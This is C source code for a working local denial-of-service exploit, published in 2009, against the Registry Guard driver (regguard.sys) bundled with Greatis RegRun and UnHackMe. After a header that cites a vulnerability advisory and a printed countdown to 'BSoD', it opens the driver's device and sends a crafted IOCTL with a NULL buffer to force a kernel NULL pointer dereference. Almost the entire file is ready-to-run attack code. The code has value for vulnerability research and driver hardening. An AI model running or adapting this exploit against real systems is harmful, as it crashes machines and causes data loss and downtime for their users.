////////////////////////////////////////////////////////////////////////////////////
// +----------------------------------------------------------------------------+ //
// |                                                                            | //
// | Greatis Software - http://www.greatis.com/                                 | //
// |                                                                            | //
// | Affected Software:                                                         | //
// | RegRun Reanimator <= 6.0.6.50                                              | //
// | RegRun Security Suite Version <= 6.00                                      | //
// | UnHackMe <= 5.5 beta                                                       | //
// |                                                                            | //
// | Affected Driver:                                                           | //
// | Registry Guard - registry keys protection driver for                       | //
// | Windows NT/2000/XP/2003/Vista - regguard.sys <= 4.0.6.0                    | //
// |                                                                            | //
// | Local Denial of Service Exploit - NULL Pointer Dereference (KeClearEvent)  | //
// | For Educational Purposes Only !                                            | //
// |                                                                            | //
// +----------------------------------------------------------------------------+ //
// |                                                                            | //
// | NT Internals - http://www.ntinternals.org/                                 | //
// | alex ntinternals org                                                       | //
// | 04 September 2009                                                          | //
// |                                                                            | //
// | References:                                                                | //
// | RegRun & UnHackMe Multiple Vulnerabilities                                 | //
// | http://www.ntinternals.org/ntiadv0811/ntiadv0811.html                      | //
// |                                                                            | //
// +----------------------------------------------------------------------------+ //
////////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "RegGuard_DoS_01.h"

#define IOCTL_DEREFERENCE_NULL_POINTER 0x222064
#define BUFFER_LENGTH 0x200


int __cdecl main(int argc, char **argv)
{
    NTSTATUS NtStatus;
    
    HANDLE DeviceHandle;
    PVOID SystemBuffer = NULL;
    
    UNICODE_STRING DeviceName;
    OBJECT_ATTRIBUTES ObjectAttributes;
    IO_STATUS_BLOCK IoStatusBlock;
    LARGE_INTEGER Interval;

    ///////////////////////////////////////////////////////////////////////////////////////////////

    system("cls");

    printf(" +----------------------------------------------------------------------------+\n"
           " |                                                                            |\n"
           " | Greatis Software - http://www.greatis.com/                                 |\n"
           " |                                                                            |\n"
           " | Affected Software:                                                         |\n"
           " | RegRun Reanimator <= 6.0.6.50                                              |\n"
           " | RegRun Security Suite Version <= 6.00                                      |\n"
           " | UnHackMe <= 5.5 beta                                                       |\n"
           " |                                                                            |\n"
           " | Affected Driver:                                                           |\n"
           " | Registry Guard - registry keys protection driver for                       |\n"
           " | Windows NT/2000/XP/2003/Vista - regguard.sys <= 4.0.6.0                    |\n"
           " |                                                                            |\n"
           " | Local Denial of Service Exploit - NULL Pointer Dereference (KeClearEvent)  |\n"
           " | For Educational Purposes Only !                                            |\n"
           " |                                                                            |\n"
           " +----------------------------------------------------------------------------+\n"
           " |                                                                            |\n"
           " | NT Internals - http://www.ntinternals.org/                                 |\n"
           " | alex ntinternals org                                                       |\n"
           " | 04 September 2009                                                          |\n"
           " |                                                                            |\n"
           " | References:                                                                |\n"
           " | RegRun & UnHackMe Multiple Vulnerabilities                                 |\n"
           " | http://www.ntinternals.org/ntiadv0811/ntiadv0811.html                      |\n"
           " |                                                                            |\n"
           " +----------------------------------------------------------------------------+\n\n");

    ///////////////////////////////////////////////////////////////////////////////////////////////

    RtlInitUnicodeString(&DeviceName, L"\\Device\\RegGuard");

    ObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
    ObjectAttributes.RootDirectory = 0;
    ObjectAttributes.ObjectName = &DeviceName;
    ObjectAttributes.Attributes = OBJ_CASE_INSENSITIVE;
    ObjectAttributes.SecurityDescriptor = NULL;
    ObjectAttributes.SecurityQualityOfService = NULL;

    
    NtStatus = NtCreateFile(
                            &DeviceHandle,                      // FileHandle
                            FILE_READ_DATA | FILE_WRITE_DATA,   // DesiredAccess
                            &ObjectAttributes,                  // ObjectAttributes
                            &IoStatusBlock,                     // IoStatusBlock
                            NULL,                               // AllocationSize OPTIONAL
                            0,                                  // FileAttributes
                            FILE_SHARE_READ | FILE_SHARE_WRITE, // ShareAccess
                            FILE_OPEN_IF,                       // CreateDisposition
                            0,                                  // CreateOptions
                            NULL,                               // EaBuffer OPTIONAL
                            0);                                 // EaLength

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtCreateFile - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }


    RtlFreeUnicodeString(&DeviceName);

    ///////////////////////////////////////////////////////////////////////////////////////////////

    Interval.LowPart = 0xFF676980;
    Interval.HighPart = 0xFFFFFFFF;

    printf(" 3");
    NtDelayExecution(FALSE, &Interval);

    printf(" 2");
    NtDelayExecution(FALSE, &Interval);

    printf(" 1");
    NtDelayExecution(FALSE, &Interval);

    printf(" BSoD\n\n");
    NtDelayExecution(FALSE, &Interval);


    NtStatus = NtDeviceIoControlFile(
                                     DeviceHandle,                   // FileHandle
                                     NULL,                           // Event
                                     NULL,                           // ApcRoutine
                                     NULL,                           // ApcContext
                                     &IoStatusBlock,                 // IoStatusBlock
                                     IOCTL_DEREFERENCE_NULL_POINTER, // IoControlCode
                                     SystemBuffer,                   // InputBuffer
                                     BUFFER_LENGTH,                  // InputBufferLength
                                     SystemBuffer,                   // OutputBuffer
                                     BUFFER_LENGTH);                 // OutBufferLength
        
    if(NtStatus)
    {
        printf(" [*] NtStatus of NtDeviceIoControlFile - 0x%.8X\n", NtStatus);
        return NtStatus;
    }

    ///////////////////////////////////////////////////////////////////////////////////////////////

    NtStatus = NtClose(DeviceHandle);

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtClose - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }

    return FALSE;
}